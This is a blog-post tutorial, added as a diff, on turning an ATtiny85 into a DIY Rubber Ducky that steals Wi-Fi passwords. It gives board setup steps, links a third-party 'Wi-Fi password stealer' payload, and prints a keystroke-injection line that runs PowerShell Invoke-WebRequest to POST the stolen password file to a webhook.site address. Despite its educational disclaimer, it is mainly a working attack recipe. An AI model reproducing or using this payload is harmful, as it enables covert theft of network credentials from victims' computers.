@@ -1,0 +1,58 @@
+---
+title: "DIY Rubber Ducky with ATtiny85"
+date: "05-14-2022"
+author: "Reda BELHAJ"
+summary: "Using ATtiny85 to create a DIY Rubber Ducky"
+tags: ["Diy", "Attiny85"]
+image: "/images/Rubber/bg.png"
+---
+
+In this article, I’ll walk through how you can create a DIY Rubber Ducky and try to steal Wifi credentials send them to a webhook site.
+
+## Requirements
+* **ATtiny85** : The ATtiny85 is a microcontroller in a similar vein to the Arduino, but with much less IO pins, smaller memory and a smaller form factor.
+* Download **Arduino IDE**.
+
+## Configuration
+First we need to add an **Additional Boards Manager** to the Arduino IDE. Open Arduino IDE > Goto file > preferences and then add or paste [the package digistump index file](http://digistump.com/package_digistump_index.json):
+
+* **Link**: http://digistump.com/package_digistump_index.json
+
+![preferences](/images/Rubber/pre.JPG)
+
+Secondly, we need to goto tools > boards manager and install **Digistump AVR Boards**
+
+![boards](/images/Rubber/boards.JPG)
+
+And now we need to install **Digistump Arduino Drivers** (just the *Digistump.Drivers.zip*) through the link below:
+
+* **Link**: https://github.com/digistump/DigistumpArduino/releases
+
+## Payloads 
+So before using one of **MTK911** payloads please make sure to read the *DISCLAIMER*:
+
+>All the software/scripts/applications/things in this repository are provided as is, without warranty of any kind. Use of these software/scripts/applications/things is entirely at your own risk. Creator of these softwares/scripts/applications/things is not responsible for any direct or indirect damage to your own or defiantly someone else's property resulting from the use of these software/scripts/applications/things.
+
+And now we are all setup. we just need a payload and for this example we are going to use **Wi-Fi password stealer** from **MTK911** Github Repo: 
+
+* **Link**: https://github.com/MTK911/Attiny85/blob/master/payloads/Wi-Fi%20password%20stealer/WifiKey-Grab_Minimize-of-Shame.ino#L1
+
+You can also test out [MTK911](https://github.com/MTK911/Attiny85)'s other payloads.
+
+![code](/images/Rubber/code.JPG)
+
+And after paste the payload into your IDE. Open [Webhook Sites](https://webhook.site) and make sure to copy your unique URL and :
+
+![webhook](/images/Rubber/webhook.JPG)
+
+Then paste the Webhook address into the code as mentioned:
+
+```
+DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS");
+DigiKeyboard.delay(1000);
+```
+
+Then Click upload on Arduino IDE. and it will copy the file to the ATtiny85 after you plug it in. And you are ready to test it out.
+
+## Disclaimer
+All the content reported in this article is for educational purposes only and we are not responsible for any use that may be made of it.
